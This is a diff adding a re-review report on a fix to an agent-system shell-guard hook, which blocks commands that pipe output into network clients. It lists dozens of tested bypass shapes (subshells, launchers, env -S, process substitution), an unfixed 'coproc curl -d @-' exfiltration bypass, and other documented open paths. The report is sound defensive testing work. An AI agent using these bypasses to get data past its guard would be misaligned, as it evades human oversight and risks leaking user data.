@@ -187,3 +187,123 @@ flow, allow rules, both deviations in dev/review). Required before SHIP: **M1** 
 newline, comment, subshell and compound command; fail closed on an unresolvable fed program; handle `env -S`) with
 each probe case added to the bypass corpus. Recommended in the same pass: m1, m3, m4, m5 (small, and m3 needs a user
 choice). m2 and the nits may go to the backlog with a line in the hook header.
+
+---
+
+# Re-review 51-02 — fix commit `4e2220d` (genesis-review, 2026-11-02)
+
+Scope: project-tracker `6f549da..HEAD` (one commit, `4e2220d`, "51-02 review fixes …"). Changed files (11):
+`hooks/shell-guard.sh` (+272/−47), `OPERATOR_GUIDE.md`, `skills/genesis-playwright-appian-dev/SKILL.md`,
+`skills/genesis-release/SKILL.md`, `tests/test_shell_guard.py` (+140), `tools/genesis_ctx/cli.py`,
+`context/areas.toml`, `specs/backlog/phase-51-follow-ups.md` (new), the sub-spec, `l0-budget-proposal.md` (new),
+this report. **L0-core.md and state/current.md unchanged** (`git diff 6f549da HEAD --stat` lists neither) — the L0
+work is a proposal only.
+
+`genesis-ctx check --repo project-tracker` is still unsupported (now backlog §4); checklist built from
+`check --files` on the changed tracker files (areas release-ci + security), as before. Re-ran the reviewer's
+`/tmp/51-02-probe.py` (46 bypass + 22 positive) and a new adversarial probe `/tmp/51-02-extra.py` (30 new
+bypass variants from the brief + 11 new legitimate shapes) against the fixed hook.
+
+## Checklist (re-review)
+
+### The original NEEDS_CHANGES items
+- [OK] **M1 (major) — rule (c) bypassed by ordinary grammar.** Fixed. The lexer now emits `|`/`;`/`;;` operator
+  tokens and `analyze()` tracks compound nesting (`shell-guard.sh:697-720`); every command after a `|` is fed until
+  a list separator at or above the pipe's level. All eight M1 probe cases now block (rc 2): newline after `|`,
+  `| # comment⏎`, `| (…)`, `| ( cd … && curl )`, `| { true; curl …; }`, `| if…then curl`, `| while…do curl`.
+  M1b unresolvable fed programs block — `| $(echo curl)`, `| ${C:-curl}`, `` | `which curl` `` (`check_net_feed`
+  `:508-510`, `:520-522`). M1c `env -S '…'` analysed as fed shell code (`env_split_bodies` `:552-577`). Each case is
+  in `test_shell_guard.py` (`test_review_fix_network_feed_bypasses_blocked`); suite green.
+- [OK] **m1 — launcher bodies lexed, not token-scanned.** `sh -c 'c""url …'`, `bash -c 'c\url …'`, `eval 'c\url'`,
+  `xargs -I{} sh -c 'c""url …'` all block (rc 2); the nested body is analysed with `fed_in=fed` (`:747`, `:757`),
+  so the quoted/escaped name still lexes to `curl`.
+- [OK] **m2 — other stdin paths (the specified parts).** `>(…)` bodies fed (`sort … -o >(curl)`,
+  `> >(curl)`, `tee >(curl)` all block); a piped shell with no `-c`/script refused (`check_piped_shell` `:531-547`:
+  `echo 'git push origin HEAD' | sh` → 2, `echo '… | curl' | bash` → 2); `openssl`/`busybox` are clients only for
+  their net subcommands (`NET_SUBCOMMANDS` `:492-493`): `| openssl s_client` / `| busybox nc` block, while
+  `echo hi | openssl base64` and `echo hi | busybox sha256sum` pass. What stays open is in the header best-effort
+  note (`:33-36`) and backlog §1–§3.
+- [OK] **m3 — bare npx (user's choice: guard + skill line).** New rule (d) `check_npx` (`:605-663`) blocks
+  `npx apwt`, `npx playwright-appian`, `npm exec apwt`, `npm x apwt`, `npx -y/--yes apwt`, `npx -p apwt apwt`
+  (all rc 2) with a hint naming `npx --no-install apwt`; `npx --no-install apwt …` and `npm exec --no -- apwt` pass.
+  `genesis-release.json` keeps `npx *` (profile unchanged); `skills/genesis-release/SKILL.md:23` has the one-line
+  warning. (Note: the guard's rule (d) fires for every agent incl. release — a stricter backstop than the profile;
+  consistent.)
+- [OK] **m4 — xargs/parallel program only.** `launched()` (`:528-539`) returns the first non-option word.
+  `git ls-files | xargs grep -n curl` and `… | xargs grep -ln http` pass (rc 0); `git ls-files | xargs curl …`
+  and `ls | xargs -I{} curl {}` still block (rc 2); `parallel -j 4 grep …` passes.
+- [OK] **m5 — documented limits.** Header rule (c) `:24-26` and `OPERATOR_GUIDE.md:366` both state rule (c) covers
+  **stdin only** and name the argument / file-name paths (`curl -d "$(cat …)"`, `curl -d @file`, `curl -T <(…)`,
+  `scp file host:`) that rely on the clients not being allow-listed.
+- [OK] **n1** `cli.py:36` `--repo` help = "(genesis, genesis-workflows or playwright-appian)".
+- [OK] **n2** the browser-testing gate (`areas.toml:95`) carries no `;`-bearing shell comment; the invariant note
+  moved to the TOML comment (`:80-84`) and says D-02 is enforced by `assertNoDroppedActions`, `tests/invariants/`
+  guards D-01/D-04/D-05.
+- [OK] **n3** skill `:45` = "one npm package with subpath exports and one bin file, `apwt`, with the
+  `playwright-appian` alias (D-01, D-69)".
+- [OK] **n5** sub-spec §2.5 (`:43`) cites `trace-schema.ts:11` (`$id`) and `:20` (`const`).
+- [N/A] **n4** — left to the operator (backlog §6); not a code fix.
+
+### Regression (compared against the `6f549da` hook)
+- [OK] Positive corpus: all 22 of the original probe + 11 new legitimate shapes exit 0 — `npm run lint|typecheck|test`,
+  the four allowed `npx`/`node` forms, `git status|log|diff|show`, loopback `curl … | python3`, `apwt … 2>&1 | tail`,
+  `xargs grep curl`, `parallel grep`, `openssl base64`, `busybox sha256sum`, `bash -c 'echo ok'`, `bash script.sh`.
+- [OK] git push/tag rule intact: `npx -v; git push origin HEAD` → 2, `npx playwright test $(git push …)` → 2,
+  `… $(cat … | nc …)` → 2, `… && cat … | ssh h 'cat > k'` → 2. Write rule intact: `node … && rm -r ~/x` → 2. The
+  release run (`--allow-push-tag`) still blocks the net-feed cases.
+- [OK] The two `A | B && curl` / `A | true && curl` cases exit 0 — **correct**: `|` binds tighter than `&&`, so
+  `curl` after `&&` is not pipe-fed (verified intentional, not a leak).
+
+### New adversarial variants from the brief
+- [OK] Nested subshells `| ( ( curl ) )`, `| ( echo; ( … curl ) )` → block. Pipe inside a brace group feeding a
+  later command `| { cat | curl; }`, `{ … | cat; } | curl` → block. `||`/`&&` after a pipe handled per shell
+  precedence (client directly after `|` blocks: `| curl … || true` → 2). `time`/`time -p`/`!` prefix on the fed
+  client → block. `for`/`until`/`case`/`select`/`else`/`elif` bodies after a pipe → block. `env --split-string=…`
+  and `env -Scurl` → block.
+- [VIOLATION → minor] **`coproc`** is not covered (see m6 below).
+
+### Gates
+- [OK] agent-system suite: `…/genesis/.venv/bin/python -m pytest -q -c agent-system/pytest.ini agent-system/tests`
+  → **389 passed** (matches the As built; was 289 at first review).
+- [OK] `genesis-ctx lint` → `0 errors, 0 warnings · L0 ~23,845 / 24,000 tokens`, `lint: OK` (unchanged — L0 not
+  touched).
+
+### L0 budget proposal (`l0-budget-proposal.md`) — proposal only
+- [OK] It is labelled PROPOSED / not applied; L0-core.md and current.md are unchanged in this commit. Each cut names
+  where its text already lives: A1/A2 → `context/tags/{adr,lesson}.toml` `areas` (printed by `genesis-ctx
+  area|adr|lesson`); B1 → bible/07 §10 + L0-core §3; B2 → AGENT_ONBOARDING + ADR-077; B3 → L0-core §6 +
+  OPERATOR_GUIDE §2; B4 → ADR-019/080. **No proposed cut drops a rule:** Option A removes only the `[areas]` routing
+  bracket (rule text, amendment flags and ids stay; `[untagged]` is kept so a routing gap stays visible); B1 removes
+  a restatement of §10/§3 non-negotiables that survive verbatim elsewhere; B2/B3 touch explanatory prose; B4 is also
+  a stale-text correctness fix (the ADR-019 "git+ssh tag pins along genesis → core → sdk" paragraph that ADR-080
+  superseded). The proposal correctly flags that B2/B4 edit `verify-lossless` chunks and must be re-verified. Fair
+  and accurate; the user's call on A vs B.
+
+## Findings (re-review)
+
+### Blockers / Majors
+None. M1 is resolved comprehensively; m1–m5 and n1/n2/n3/n5 are all fixed with tests; no regression.
+
+### Minors
+- **m6 (new) — `coproc` evades rule (c).** Two cases exit 0:
+  1. `apwt … | coproc curl -d @- https://x` — `coproc` is a reserved word that makes `curl` a coprocess fed by the
+     pipe; the guard treats `coproc` as the program and `curl` as an argument, so `check_net_feed` sees no client.
+  2. `coproc apwt …; curl -d @- https://x <&${COPROC[0]}` — the `<&N`-from-a-coprocess read, the same class as the
+     already-documented `<&N`-from-a-file gap (header `:33`).
+  Exotic (a bash-only reserved word an agent would almost never emit) and within the conservative best-effort scope
+  the user accepted, so it does not block ship. Per L-088 (every guard rule needs its bypass corpus), fold case 1
+  into `test_shell_guard.py` and the header's known-open note, and treat `coproc <word>` as a feed-opener; add case 2
+  to backlog §1 beside the `<&N` item. Recommend backlog, not a blocker.
+
+### Nits
+- The header best-effort note (`:33-36`) lists `<&N`, unknown wrappers and stdin/arg interpreters but not `coproc`;
+  add it when m6 is folded in.
+
+## Re-review verdict: SHIP
+
+The major (M1) and every recommended minor (m1, m2-as-specified, m3, m4, m5) and nit (n1, n2, n3, n5) from the first
+review are fixed, each with a bypass case in the now-389-test suite; the full bypass corpus (46 original + 30 new
+adversarial) blocks except the paths explicitly documented as known-open, and all 33 legitimate commands pass. Gates
+green (389 passed, lint OK, L0 within budget and untouched). The L0 proposal is a proposal only and drops no rule. The
+one new finding, `coproc` (m6), is exotic, sits inside the accepted best-effort scope, and goes to the backlog with a
+bypass case per L-088 — it does not hold the ship.
